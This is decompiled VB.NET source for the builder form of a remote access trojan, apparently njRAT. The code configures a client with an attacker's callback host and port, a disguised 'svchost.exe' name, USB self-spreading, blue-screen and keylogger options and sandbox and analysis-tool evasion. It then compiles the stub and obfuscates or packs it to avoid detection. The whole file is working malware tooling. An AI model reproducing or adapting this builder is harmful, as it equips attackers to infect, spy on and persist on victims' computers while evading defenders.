Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My
Imports NJRAT.My.Resources

Namespace NJRAT
	' Token: 0x0200000C RID: 12
	<DesignerGenerated()>
	Public Partial Class Builder
		Inherits Form

		' Token: 0x1700003D RID: 61
		' (get) Token: 0x06000084 RID: 132 RVA: 0x00006A0D File Offset: 0x00004C0D
		' (set) Token: 0x06000085 RID: 133 RVA: 0x00006A17 File Offset: 0x00004C17
		Friend Overridable Property host As TextBox

		' Token: 0x1700003E RID: 62
		' (get) Token: 0x06000086 RID: 134 RVA: 0x00006A20 File Offset: 0x00004C20
		' (set) Token: 0x06000087 RID: 135 RVA: 0x00006A2A File Offset: 0x00004C2A
		Friend Overridable Property Label1 As Label

		' Token: 0x1700003F RID: 63
		' (get) Token: 0x06000088 RID: 136 RVA: 0x00006A33 File Offset: 0x00004C33
		' (set) Token: 0x06000089 RID: 137 RVA: 0x00006A3D File Offset: 0x00004C3D
		Friend Overridable Property Label2 As Label

		' Token: 0x17000040 RID: 64
		' (get) Token: 0x0600008A RID: 138 RVA: 0x00006A46 File Offset: 0x00004C46
		' (set) Token: 0x0600008B RID: 139 RVA: 0x00006A50 File Offset: 0x00004C50
		Friend Overridable Property port As NumericUpDown

		' Token: 0x17000041 RID: 65
		' (get) Token: 0x0600008C RID: 140 RVA: 0x00006A59 File Offset: 0x00004C59
		' (set) Token: 0x0600008D RID: 141 RVA: 0x00006A64 File Offset: 0x00004C64
		Friend Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000042 RID: 66
		' (get) Token: 0x0600008E RID: 142 RVA: 0x00006AA7 File Offset: 0x00004CA7
		' (set) Token: 0x0600008F RID: 143 RVA: 0x00006AB1 File Offset: 0x00004CB1
		Friend Overridable Property Label5 As Label

		' Token: 0x17000043 RID: 67
		' (get) Token: 0x06000090 RID: 144 RVA: 0x00006ABA File Offset: 0x00004CBA
		' (set) Token: 0x06000091 RID: 145 RVA: 0x00006AC4 File Offset: 0x00004CC4
		Friend Overridable Property VN As TextBox

		' Token: 0x17000044 RID: 68
		' (get) Token: 0x06000092 RID: 146 RVA: 0x00006ACD File Offset: 0x00004CCD
		' (set) Token: 0x06000093 RID: 147 RVA: 0x00006AD7 File Offset: 0x00004CD7
		Friend Overridable Property bsod As CheckBox

		' Token: 0x17000045 RID: 69
		' (get) Token: 0x06000094 RID: 148 RVA: 0x00006AE0 File Offset: 0x00004CE0
		' (set) Token: 0x06000095 RID: 149 RVA: 0x00006AEA File Offset: 0x00004CEA
		Friend Overridable Property T1 As TextBox

		' Token: 0x17000046 RID: 70
		' (get) Token: 0x06000096 RID: 150 RVA: 0x00006AF3 File Offset: 0x00004CF3
		' (set) Token: 0x06000097 RID: 151 RVA: 0x00006AFD File Offset: 0x00004CFD
		Friend Overridable Property Isf As CheckBox

		' Token: 0x17000047 RID: 71
		' (get) Token: 0x06000098 RID: 152 RVA: 0x00006B06 File Offset: 0x00004D06
		' (set) Token: 0x06000099 RID: 153 RVA: 0x00006B10 File Offset: 0x00004D10
		Friend Overridable Property Isu As CheckBox

		' Token: 0x17000048 RID: 72
		' (get) Token: 0x0600009A RID: 154 RVA: 0x00006B19 File Offset: 0x00004D19
		' (set) Token: 0x0600009B RID: 155 RVA: 0x00006B23 File Offset: 0x00004D23
		Friend Overridable Property klen As NumericUpDown

		' Token: 0x17000049 RID: 73
		' (get) Token: 0x0600009C RID: 156 RVA: 0x00006B2C File Offset: 0x00004D2C
		' (set) Token: 0x0600009D RID: 157 RVA: 0x00006B36 File Offset: 0x00004D36
		Friend Overridable Property Label6 As Label

		' Token: 0x1700004A RID: 74
		' (get) Token: 0x0600009E RID: 158 RVA: 0x00006B3F File Offset: 0x00004D3F
		' (set) Token: 0x0600009F RID: 159 RVA: 0x00006B4C File Offset: 0x00004D4C
		Friend Overridable Property Anti_CH As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._Anti_CH
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.Anti_CH_CheckedChanged
				Dim anti_CH As CheckBox = Me._Anti_CH
				If anti_CH IsNot Nothing Then
					RemoveHandler anti_CH.CheckedChanged, value2
				End If
				Me._Anti_CH = value
				anti_CH = Me._Anti_CH
				If anti_CH IsNot Nothing Then
					AddHandler anti_CH.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700004B RID: 75
		' (get) Token: 0x060000A0 RID: 160 RVA: 0x00006B8F File Offset: 0x00004D8F
		' (set) Token: 0x060000A1 RID: 161 RVA: 0x00006B99 File Offset: 0x00004D99
		Friend Overridable Property Label3 As Label

		' Token: 0x1700004C RID: 76
		' (get) Token: 0x060000A2 RID: 162 RVA: 0x00006BA2 File Offset: 0x00004DA2
		' (set) Token: 0x060000A3 RID: 163 RVA: 0x00006BAC File Offset: 0x00004DAC
		Friend Overridable Property exe As TextBox

		' Token: 0x1700004D RID: 77
		' (get) Token: 0x060000A4 RID: 164 RVA: 0x00006BB5 File Offset: 0x00004DB5
		' (set) Token: 0x060000A5 RID: 165 RVA: 0x00006BBF File Offset: 0x00004DBF
		Friend Overridable Property Label4 As Label

		' Token: 0x1700004E RID: 78
		' (get) Token: 0x060000A6 RID: 166 RVA: 0x00006BC8 File Offset: 0x00004DC8
		' (set) Token: 0x060000A7 RID: 167 RVA: 0x00006BD2 File Offset: 0x00004DD2
		Friend Overridable Property dir As ComboBox

		' Token: 0x1700004F RID: 79
		' (get) Token: 0x060000A8 RID: 168 RVA: 0x00006BDB File Offset: 0x00004DDB
		' (set) Token: 0x060000A9 RID: 169 RVA: 0x00006BE8 File Offset: 0x00004DE8
		Friend Overridable Property Idr As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._Idr
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.Idr_CheckedChanged
				Dim idr As CheckBox = Me._Idr
				If idr IsNot Nothing Then
					RemoveHandler idr.CheckedChanged, value2
				End If
				Me._Idr = value
				idr = Me._Idr
				If idr IsNot Nothing Then
					AddHandler idr.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000050 RID: 80
		' (get) Token: 0x060000AA RID: 170 RVA: 0x00006C2B File Offset: 0x00004E2B
		' (set) Token: 0x060000AB RID: 171 RVA: 0x00006C35 File Offset: 0x00004E35
		Friend Overridable Property GroupBox1 As GroupBox

		' Token: 0x17000051 RID: 81
		' (get) Token: 0x060000AC RID: 172 RVA: 0x00006C3E File Offset: 0x00004E3E
		' (set) Token: 0x060000AD RID: 173 RVA: 0x00006C48 File Offset: 0x00004E48
		Friend Overridable Property USB_SP As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._USB_SP
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.USB_SP_CheckedChanged
				Dim usb_SP As CheckBox = Me._USB_SP
				If usb_SP IsNot Nothing Then
					RemoveHandler usb_SP.CheckedChanged, value2
				End If
				Me._USB_SP = value
				usb_SP = Me._USB_SP
				If usb_SP IsNot Nothing Then
					AddHandler usb_SP.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000052 RID: 82
		' (get) Token: 0x060000AE RID: 174 RVA: 0x00006C8B File Offset: 0x00004E8B
		' (set) Token: 0x060000AF RID: 175 RVA: 0x00006C98 File Offset: 0x00004E98
		Friend Overridable Property CKOBF As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._CKOBF
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CKOBF_CheckedChanged
				Dim ckobf As CheckBox = Me._CKOBF
				If ckobf IsNot Nothing Then
					RemoveHandler ckobf.CheckedChanged, value2
				End If
				Me._CKOBF = value
				ckobf = Me._CKOBF
				If ckobf IsNot Nothing Then
					AddHandler ckobf.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000053 RID: 83
		' (get) Token: 0x060000B0 RID: 176 RVA: 0x00006CDB File Offset: 0x00004EDB
		' (set) Token: 0x060000B1 RID: 177 RVA: 0x00006CE5 File Offset: 0x00004EE5
		Friend Overridable Property CKUpx As CheckBox

		' Token: 0x060000B2 RID: 178 RVA: 0x00006CEE File Offset: 0x00004EEE
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Builder_Load
			Me.string_0 = Nothing
			Me.InitializeComponent()
		End Sub

		' Token: 0x060000B3 RID: 179 RVA: 0x00006D1C File Offset: 0x00004F1C
		Private Sub Builder_Load(sender As Object, e As EventArgs)
			Me.CKUpx.Visible = False
			MyBase.Icon = Resources.icon
			Me.dir.SelectedIndex = 0
			Me.host.Text = Class6.smethod_2("host", Me.host.Text)
			Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("p", Conversions.ToString(Me.port.Value)))
			Me.exe.Text = Class6.smethod_2("exe", Me.exe.Text)
			Me.dir.SelectedIndex = Conversions.ToInteger(Class6.smethod_2("dir", Conversions.ToString(Me.dir.SelectedIndex)))
			Me.VN.Text = Class6.smethod_2("vn", Me.VN.Text)
			Me.bsod.Checked = Conversions.ToBoolean(Class6.smethod_2("bsod", Me.bsod.Checked.ToString()))
			Me.Idr.Checked = Conversions.ToBoolean(Class6.smethod_2("Idr", Me.Idr.Checked.ToString()))
			Me.Isu.Checked = Conversions.ToBoolean(Class6.smethod_2("Isu", Me.Isu.Checked.ToString()))
			Me.Isf.Checked = Conversions.ToBoolean(Class6.smethod_2("Isf", Me.Isf.Checked.ToString()))
			Me.USB_SP.Checked = Conversions.ToBoolean(Class6.smethod_2("USB_SP", Me.USB_SP.Checked.ToString()))
			Me.klen.Value = Conversions.ToDecimal(Class6.smethod_2("klen", Me.klen.Value.ToString()))
			Me.Anti_CH.Checked = Conversions.ToBoolean(Class6.smethod_2("Anti_CH", Me.Anti_CH.Checked.ToString()))
			Me.string_0 = Class6.smethod_2("ico", String.Empty)
			Dim flag As Boolean = Not File.Exists(Me.string_0)
			If flag Then
				Me.string_0 = String.Empty
			End If
			Dim flag2 As Boolean = Convert.ToDouble(Me.port.Value) <> Conversions.ToDouble(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))
			If flag2 Then
				Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))
			End If
			Try
			Catch ex As Exception
				Me.string_0 = String.Empty
			End Try
		End Sub

		' Token: 0x060000B4 RID: 180 RVA: 0x00007028 File Offset: 0x00005228
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim saveFileDialog As SaveFileDialog = New SaveFileDialog() With { .Filter = "EXE|*.exe", .FileName = "Client.exe" }
			Dim flag As Boolean = saveFileDialog.ShowDialog() = DialogResult.OK
			If flag Then
				Dim flag2 As Boolean = File.Exists(saveFileDialog.FileName)
				If flag2 Then
					File.Delete(saveFileDialog.FileName)
				End If
				Dim text As String = File.ReadAllText(Application.StartupPath + "\Stub\Stub.il")
				Dim newValue As String = Class6.smethod_4(String.Concat(New String() { Me.VN.Text, Me.host.Text, Conversions.ToString(Me.port.Value), Me.exe.Text, Me.dir.Text, Me.bsod.Checked.ToString(), Me.Idr.Checked.ToString(), Me.Isu.Checked.ToString(), Me.Isf.Checked.ToString(), Me.USB_SP.Checked.ToString(), Me.Anti_CH.Checked.ToString() }))
				Dim vn As TextBox = Me.VN
				Dim text2 As String = vn.Text
				vn.Text = text2
				text = text.Replace("[VN]", Class6.smethod_14(text2)).Replace("[H]", Me.host.Text).Replace("[P]", Conversions.ToString(Me.port.Value)).Replace("[EXE]", Me.exe.Text).Replace("[DR]", Me.dir.Text.Replace("%", String.Empty)).Replace("[BD]", Me.bsod.Checked.ToString()).Replace("[RG]", newValue).Replace("[Idr]", Me.Idr.Checked.ToString()).Replace("[Isu]", Me.Isu.Checked.ToString()).Replace("[Isf]", Me.Isf.Checked.ToString()).Replace("[USB_SP]", Me.USB_SP.Checked.ToString()).Replace("[klen]", Me.klen.Value.ToString()).Replace("[Anti_CH]", Me.Anti_CH.Checked.ToString())
				File.WriteAllText(Interaction.Environ("temp") + "\stub.il", text)
				Dim startInfo As ProcessStartInfo = New ProcessStartInfo() With { .FileName = Interaction.Environ("windir") + "\Microsoft.NET\Framework\v2.0.50727\ilasm.exe", .CreateNoWindow = True, .WindowStyle = ProcessWindowStyle.Hidden, .Arguments = String.Concat(New String() { "/alignment=512 /QUIET """, Interaction.Environ("temp"), "\stub.il"" /output:""", saveFileDialog.FileName, """" }) }
				Process.Start(startInfo).WaitForExit()
				Dim flag3 As Boolean = Me.string_0 IsNot Nothing AndAlso File.Exists(Me.string_0)
				If flag3 Then
					IconN.InjectIcon(saveFileDialog.FileName, Me.string_0)
				End If
				Dim intptr_ As IntPtr = GClass2.BeginUpdateResource(saveFileDialog.FileName, False)
				Dim array As Byte() = File.ReadAllBytes(Application.StartupPath + "\Stub\Stub.manifest")
				GClass2.UpdateResource(intptr_, CType(24, IntPtr), CType(1, IntPtr), 0S, array, array.Length)
				GClass2.EndUpdateResource(intptr_, False)
				Class6.smethod_3("host", Me.host.Text)
				Class6.smethod_3("p", Conversions.ToString(Me.port.Value))
				Class6.smethod_3("exe", Me.exe.Text)
				Class6.smethod_3("dir", Conversions.ToString(Me.dir.SelectedIndex))
				Class6.smethod_3("vn", Me.VN.Text)
				Class6.smethod_3("bsod", Me.bsod.Checked.ToString())
				Class6.smethod_3("ico", Me.string_0)
				Class6.smethod_3("Idr", Me.Idr.Checked.ToString())
				Class6.smethod_3("Isu", Me.Isu.Checked.ToString())
				Class6.smethod_3("Isf", Me.Isf.Checked.ToString())
				Class6.smethod_3("USB_SP", Me.USB_SP.Checked.ToString())
				Class6.smethod_3("klen", Me.klen.Value.ToString())
				Class6.smethod_3("Anti_CH", Me.Anti_CH.Checked.ToString())
				MyBase.Close()
				Thread.Sleep(100)
				Dim checked As Boolean = Me.CKOBF.Checked
				If checked Then
					Application.DoEvents()
					Dim dotNET_Reactor As Byte() = Resources.dotNET_Reactor
					File.WriteAllBytes(Application.StartupPath + "\dotNET_Reactor.exe", dotNET_Reactor)
					Interaction.Shell(String.Concat(New String() { "cmd.exe /C dotNET_Reactor.exe -file """, saveFileDialog.FileName, """ -admin 0 -shownagscreen 0 -showloadingscreen 0 -targetfile """, saveFileDialog.FileName, """ -antitamp 1 -compression 1 -control_flow_obfuscation 1  -flow_level 9 -nativeexe 0 -necrobit 1 -necrobit_comp 1 -prejit 0 -incremental_obfuscation 1 -obfuscate_public_types 1 -resourceencryption 1 -stringencryption 1 -antistrong 1" }), AppWinStyle.NormalFocus, True, -1)
					Thread.Sleep(100)
					MyBase.Close()
					MyProject.Computer.FileSystem.DeleteFile(Application.StartupPath + "\dotNET_Reactor.exe")
				End If
				Dim checked2 As Boolean = Me.CKUpx.Checked
				If checked2 Then
					Application.DoEvents()
					Dim mpress As Byte() = Resources.mpress
					File.WriteAllBytes(Application.StartupPath + "\mpress.exe", mpress)
					Interaction.Shell("cmd.exe /C mpress.exe -s """ + saveFileDialog.FileName + """", AppWinStyle.NormalFocus, True, -1)
					Thread.Sleep(100)
					MyBase.Close()
					MyProject.Computer.FileSystem.DeleteFile(Application.StartupPath + "\mpress.exe")
				End If
				MessageBox.Show("Stub created successfully.", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			End If
		End Sub

		' Token: 0x060000B5 RID: 181 RVA: 0x000076C0 File Offset: 0x000058C0
		Private Sub Idr_CheckedChanged(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.Idr.Checked
			If flag Then
				Dim flag2 As Boolean = Operators.CompareString(Me.exe.Text, String.Empty, False) = 0
				If flag2 Then
					Me.exe.Text = "svchost.exe"
				End If
				Me.exe.Enabled = False
				Me.dir.Enabled = False
			Else
				Me.exe.Enabled = True
				Me.dir.Enabled = True
			End If
		End Sub

		' Token: 0x060000B6 RID: 182 RVA: 0x0000774C File Offset: 0x0000594C
		Private Sub Anti_CH_CheckedChanged(sender As Object, e As EventArgs)
			Dim toolTip As ToolTip = New ToolTip()
			toolTip.SetToolTip(Me.Anti_CH, "Vmware|Virtualbox|Sandboxie|Wireshark|ApateDNS|AndSomeDisassemblersApps")
		End Sub

		' Token: 0x060000B7 RID: 183 RVA: 0x00007774 File Offset: 0x00005974
		Private Sub USB_SP_CheckedChanged(sender As Object, e As EventArgs)
			Dim toolTip As ToolTip = New ToolTip()
			toolTip.SetToolTip(Me.USB_SP, "It will copy your Clinet.exe on any usb attached to PC")
		End Sub

		' Token: 0x060000B8 RID: 184 RVA: 0x0000779C File Offset: 0x0000599C
		Private Sub CKOBF_CheckedChanged(sender As Object, e As EventArgs)
			Dim toolTip As ToolTip = New ToolTip()
			toolTip.SetToolTip(Me.CKOBF, "A very simple obfuscation, DON'T use it if you want to use some crypter")
		End Sub

		' Token: 0x04000050 RID: 80
		Private string_0 As String
	End Class
End Namespace
